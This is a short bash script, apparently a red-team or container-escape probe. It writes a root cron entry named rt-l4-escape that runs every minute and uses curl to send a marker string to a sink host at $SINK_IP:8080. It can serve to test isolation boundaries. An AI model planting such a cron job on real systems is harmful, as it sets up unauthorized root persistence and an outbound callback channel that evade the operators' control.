#!/bin/bash
. /opt/rt/work/target.env
echo "* * * * * root curl -s -m 3 -d 'rt-l4 cron' http://$SINK_IP:8080/cron" > /etc/cron.d/rt-l4-escape
